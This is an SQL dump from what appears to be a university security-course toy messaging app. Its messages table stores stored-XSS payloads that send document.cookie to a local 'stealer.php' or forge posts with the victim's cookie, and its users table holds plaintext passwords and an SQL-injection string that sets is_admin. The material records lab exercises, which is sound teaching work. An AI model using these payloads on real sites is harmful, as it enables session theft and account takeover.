-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Oct 16, 2022 at 01:36 AM
-- Server version: 5.7.36
-- PHP Version: 7.4.26

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `cs5340-toy-application`
--

-- --------------------------------------------------------

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
CREATE TABLE IF NOT EXISTS `messages` (
  `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `user_id` varchar(25) DEFAULT NULL,
  `message` text,
  `time` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=282 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `messages`
--

INSERT INTO `messages` (`id`, `user_id`, `message`, `time`) VALUES
(1, 'admin', 'Test Message: Tesla is recalling nearly 1.1 million of its vehicles due to an automatic window safety issue that can cause fingers to be pinched.', 1663987669),
(51, 'subhash', '<script>\r\n var i = new Image();\r\n i.src = \"http://localhost/stealer.php?cookie=\" + \r\ndocument.cookie\r\n</script>', 1665612765),
(52, 'user', '<script>\r\n var i = new Image();\r\n i.src = \"http://localhost/stealer.php?cookie=\" + \r\ndocument.cookie\r\n</script>', 1665612824),
(53, 'admin', '<script>\r\n var i = new Image();\r\n i.src = \"http://localhost/stealer.php?cookie=\" + \r\ndocument.cookie\r\n</script>', 1665612955),
(54, 'subhash', '<script>\r\n var i = new Image();\r\n i.src = \"http://localhost/stealer.php?cookie=\" + \r\ndocument.cookie\r\n</script>', 1665613162),
(55, 'subhash', '<script>\r\n var i = new Image();\r\n i.src = \"http://localhost/stealer.php?cookie=\" + \r\ndocument.cookie\r\n</script>', 1665613200),
(56, 'subhash', '<script>\n var i = new Image();\n i.src = \"http://localhost/stealer.php?cookie=\" + \ndocument.cookie\n</script>', 1665613272),
(57, 'user', '<script>\r\n var i = new Image();\r\n i.src = \"http://localhost/stealer.php?cookie=\" + \r\ndocument.cookie\r\n</script>', 1665613307),
(58, 'user', 'hi, this is a testing from an attacker.', 1665618291),
(59, 'user', 'hello world!!!!', 1665618468),
(60, 'subhash', 'hello', 1665622938),
(65, 'attacker', '<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\",\"http://localhost/post-message.php\", true);\nxhr.setRequestHeader(\"Host\",\"localhost\");\nxhr.setRequestHeader(\"Connection\",\"\");\nxhr.setRequestHeader(\"Cookie\", document.cookie);\nxhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\nxhr.send(\"message_text=Testing the post message with HTTP header Live!!!&post_message=1\");\n</script>', 1665798134),
(234, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665798658),
(235, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665798782),
(236, 'attacker', '<script>\r\nvar xhr = new XMLHttpRequest();\r\nxhr.open(\"POST\",\"http://localhost/post-message.php\", true);\r\nxhr.setRequestHeader(\"Host\",\"localhost\");\r\nxhr.setRequestHeader(\"Connection\",\"keep-alive\");\r\nxhr.setRequestHeader(\"Cookie\", document.cookie);\r\nxhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\r\nxhr.send(\"message_text=Testing the post message with HTTP header Live!!!&post_message=1\");\r\n</script>', 1665799413),
(237, 'victim', 'Testing the post message with HTTP header Live!!!', 1665799592),
(238, 'victim', 'Testing the post message with HTTP header Live!!!', 1665799592),
(239, 'victim', 'Testing the post message with HTTP header Live!!!', 1665799597),
(240, 'victim', 'Testing the post message with HTTP header Live!!!', 1665799597),
(241, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800100),
(242, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800100),
(243, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800106),
(244, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800106),
(245, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800107),
(246, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800107),
(247, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800108),
(248, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800108),
(249, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800108),
(250, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800108),
(251, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800108),
(252, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800108),
(253, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800109),
(254, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800109),
(255, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800113),
(256, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800113),
(257, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800114),
(258, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800114),
(259, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800114),
(260, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800114),
(261, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800115),
(262, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800115),
(263, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800381),
(264, 'subhash', 'Testing the post message with HTTP header Live!!!', 1665800381),
(265, 'victim', 'Testing the post message with HTTP header Live!!!', 1665848953),
(266, 'victim', 'Testing the post message with HTTP header Live!!!', 1665848953),
(267, 'victim', 'Testing the post message with HTTP header Live!!!', 1665849107),
(268, 'victim', 'Testing the post message with HTTP header Live!!!', 1665849107),
(269, 'victim', 'Testing the post message with HTTP header Live!!!', 1665850039),
(270, 'victim', 'Testing the post message with HTTP header Live!!!', 1665850039),
(271, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665851429),
(272, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665851429),
(273, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665854072),
(274, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665854072),
(275, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665872233),
(276, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665872233),
(277, 'attacker', '<script>alert(\"hello\")</script>', 1665876157),
(279, 'attacker', 'Testing the post message with HTTP header Live!!!', 1665876172),
(281, 'attacker', '<script>\r\nvar xhr = new XMLHttpRequest();\r\nxhr.open(\"POST\",\"http://localhost/post-message.php\", true);\r\nxhr.setRequestHeader(\"Host\",\"localhost\");\r\nxhr.setRequestHeader(\"Connection\",\"\");\r\nxhr.setRequestHeader(\"Cookie\", document.cookie);\r\nxhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\r\nxhr.send(\"message_text=Testing the post message with HTTP header Live!!!&post_message=1\");\r\n</script>', 1665877479);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `username` varchar(25) NOT NULL DEFAULT '',
  `password` varchar(100) DEFAULT NULL,
  `firstname` varchar(25) DEFAULT NULL,
  `lastname` varchar(25) DEFAULT NULL,
  `is_admin` tinyint(1) DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT '1',
  PRIMARY KEY (`username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`username`, `password`, `firstname`, `lastname`, `is_admin`, `is_active`) VALUES
('admin', 'admin', 'Admin', 'User', 1, 1),
('attacker', 'newpassword\',is_admin=\'1', 'attacker', '', 0, 1),
('subhash', 'subhash', 'Subhash', 'M', 0, 1),
('user', 'user', 'Ordinary', 'User', 0, 1),
('victim', 'victim', 'victim', '', 0, 1);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
